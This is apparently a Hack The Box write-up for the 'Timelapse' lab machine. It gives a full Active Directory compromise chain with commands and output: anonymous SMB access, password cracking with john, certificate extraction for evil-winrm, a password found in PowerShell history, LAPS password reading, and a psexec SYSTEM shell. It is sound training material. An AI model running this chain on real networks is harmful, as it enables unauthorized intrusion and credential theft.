# [timelapse](https://app.hackthebox.com/machines/Timelapse)

> A Windows Active Directory domain controller with an anonymously accessible SMB share containing a password-protected ZIP archive. The ZIP's password is in [rockyou.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz) and thus, is easily recoverable. The ZIP contains a [PFX](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) file, which itself contains an SSL certificate and a private key. The PFX file is itself password-protected, but its password is also in `rockyou.txt` and thus, easily recoverable as well. After extracting the certificate and private key from the PFX file, they can be used to access the target via WinRM. The user's PowerShell console history file contains the credential of another user account that has the permission to read the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) password of the target, which grants administrative access.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/timelapse.masscan 10.129.227.105
$ cat enum/timelapse.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,49667,49673,49674,49695,53,593,5986,636,88,9389,
```

The target's TCP ports 53, 88, and 389 are all open, indicating it is likely a Windows Active Directory domain controller.

WinRM over TLS is open on 5986.

The LDAP and WinRM ports leak the domain name `timelapse.htb` and the hostname `dc01.timelapse.htb`. Add these to the local DNS resolver.

```bash
$ nmap -sC -sV -p135,139,3268,3269,389,445,464,49667,49673,49674,49695,53,593,5986,636,88,9389 10.129.227.105 -oA enum/timelapse
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 12:28 EDT
Nmap scan report for 10.129.227.105
Host is up (0.23s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2022-03-30 00:28:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2022-03-30T00:29:52+00:00; +7h59m59s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-time:
|   date: 2022-03-30T00:29:11
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.87 seconds
```

---

## SMB Enumeration

The target's operating system is 64-bit Windows 10, build 17763.

```bash
$ crackmapexec smb dc01.timelapse.htb
SMB         10.129.227.105  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

Anonymous SMB access is allowed and there is a non-standard share, `Shares`.

```bash
$ smbmap -u "foobar" -p "" -P 445 -H dc01.timelapse.htb
[+] Guest session       IP: dc01.timelapse.htb:445      Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

`Shares` contains two folders: `Dev/` and `HelpDesk/`. `Shares/HelpDesk/` contains several documents about [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899), a solution for managing the passwords of local accounts on domain-joined computers. When not configured properly, LAPS is a known privilege escalation vector, allowing particular users to read the local administrator account passwords of configured domain-joined computers. If LAPS is in play on the target domain, this may be a method of elevation later on.

`Shares/Dev/` contains a password-protected ZIP archive, `winrm_backup.zip`.

```bash
$ smbclient //dc01.timelapse.htb/Shares -W timelapse.htb -U foobar
Enter TIMELAPSE.HTB\foobar's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1127018 blocks available
				
smb: \> cd Dev
s
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1126080 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)

smb: \Dev\> cd ..
smb: \> cd HelpDesk
lsmb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1123953 blocks available

```

```bash
$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:
```

---

## PFX Extraction & WinRM Access as `legacyy`

Brute force the ZIP locally with `john` and `rockyou.txt` to recover the password: `supremelegacy`.

```bash
$ zip2john winrm_backup.zip > winrm_backup.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
$ john --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2022-03-29 12:55) 2.564g/s 8906Kp/s 8906Kc/s 8906KC/s suzyqzb..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Unzipping the archive results in a [PFX](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/personal-information-exchange---pfx--files) file, `legacyy_dev_auth.pfx`.

```bash
$ unzip winrm_backup.zip
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password:supremelegacy
  inflating: legacyy_dev_auth.pfx
```

A PFX file contains an SSL certificate and its corresponding private key. If these can be extracted from the file, they can probably be used to authenticated to the target over WinRM as the `legacyy` or `dev` user (based on the name of the file).

To extract these from the PFX, first brute force it with `john` and `rockyou.txt`, recovering the password, `thuglegacy`.

```bash
$ python2.7 /opt/2john/pfx2john.py legacyy_dev_auth.pfx > legacyy_dev_auth.hash   $ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)
1g 0:00:00:13 DONE (2022-03-29 13:32) 0.07299g/s 235893p/s 235893c/s 235893C/s thyriana..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Using [this IBM article](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) as a guide, extract the encrypted private key.

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
Enter Import Password:thuglegacy
Enter PEM pass phrase:blah
Verifying - Enter PEM pass phrase:blah
$ ls legacyy_dev_auth.key
legacyy_dev_auth.key
```

Decrypt the private key.

```bash
$ openssl rsa -in legacyy_dev_auth.key -out legacyy_dev_auth-decrypted.key
Enter pass phrase for legacyy_dev_auth.key:blah
writing RSA key
$ ls legacyy_dev_auth-decrypted.key
legacyy_dev_auth-decrypted.key
```

Extract the certificate which contains the public key.

```bash
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:thuglegacy
$ ls legacyy_dev_auth.crt
legacyy_dev_auth.crt
```

Use the certificate and decrypted private key to access the target via WinRM and grab the user flag from `C:\Users\legacyy\Desktop\user.txt`.

```bash
$ evil-winrm -i dc01.timelapse.htb --ssl -u timelapse.htb\\legacyy -c legacyy_dev_auth.crt -k legacyy_dev_auth-decrypted.key
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> ls C:\Users\legacyy\Desktop\user.txt


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/29/2022   5:24 PM             34 user.txt
```

---

## Domain & Local Enumeration

With a foothold on the domain, enumerate the domain's principals and the relationships between them.

Looking through this data, other than WinRM access to `dc01.timelapse.htb`, `legacyy` doesn't seem to have any other useful privileges in the domain.

Following the lead based on the LAPS-related contents of `Shares/HelpDesk/`, it does appear that LAPS is enabled for `dc01.timelapse.htb`. There exists a user `timelapse.htb\svc_deploy` who is a member of the `LAPS_Readers` group, which has `ReadLAPSPassword` permission on `dc01.timelapse.htb`. With access to this account, it will be possible to read the local administrator password on `dc01.timelapse.htb` (which is also the domain administrator).

![](images/Pasted%20image%2020220329154752.png)

Further domain enumeration doesn't yield any clear misconfiguration paths from `legacyy` to `svc_deploy`. However, local enumeration proves fruitful. `legacyy`'s PowerShell console history contains a snippet of code initiating a PowerShell session as `svc_deploy` to run a command on `dc01.timelapse.htb`, revealing `svc_deploy`'s password: `E3R$Q62^12p7PLlC%KWaxuaV`.

```powershell
*Evil-WinRM* PS C:\Users\legacyy> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

---

## Reading the LAPS Password

Use the credential `timelapse.htb\svc_deploy`:`E3R$Q62^12p7PLlC%KWaxuaV` to read the LAPS password for `dc01.timelapse.htb\Administrator`: `f469u3,.rqn-,l@EE8z05;vW`.

```bash
$ crackmapexec ldap dc01.timelapse.htb -d timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --kdcHost dc01.timelapse.htb -M laps
LDAP        10.129.157.4    389    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
LDAP        10.129.157.4    389    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
LAPS        10.129.157.4    389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.157.4    389    DC01             Computer: DC01$                Password: f469u3,.rqn-,l@EE8z05;vW
```

Since `dc01.timelapse.htb` is `timelapse.htb`'s domain controller, `dc01.timelapse.htb\Administrator` is also the domain administrator account, `timelapse.htb\Administrator`. Confirm the credential `timelapse.htb\Administrator`:`f469u3,.rqn-,l@EE8z05;vW` works.

```bash
$ crackmapexec smb dc01.timelapse.htb -d timelapse.htb -u Administrator -p 'f469u3,.rqn-,l@EE8z05;vW' --kdcHost dc01.timelapse.htb
SMB         10.129.157.4    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.157.4    445    DC01             [+] timelapse.htb\Administrator:f469u3,.rqn-,l@EE8z05;vW (Pwn3d!)
```

Leverage `impacket-psexec` and the domain administrator credential to get an `NT AUTHORITY\SYSTEM` shell on the machine and read the system flag from `C:\Users\TRX\Desktop\root.txt`.

```bash
$ impacket-psexec timelapse.htb/Administrator:'f469u3,.rqn-,l@EE8z05;vW'@dc01.timelapse.htb
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc01.timelapse.htb.....
[*] Found writable share ADMIN$
[*] Uploading file nZwMcNCw.exe
[*] Opening SVCManager on dc01.timelapse.htb.....
[*] Creating service rvTG on dc01.timelapse.htb.....
[*] Starting service rvTG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2686]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> dir C:\Users\TRX\Desktop\root.txt
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

 Directory of C:\Users\TRX\Desktop

03/29/2022  05:31 PM                34 root.txt
               1 File(s)             34 bytes
               0 Dir(s)   4,888,571,904 bytes free
```
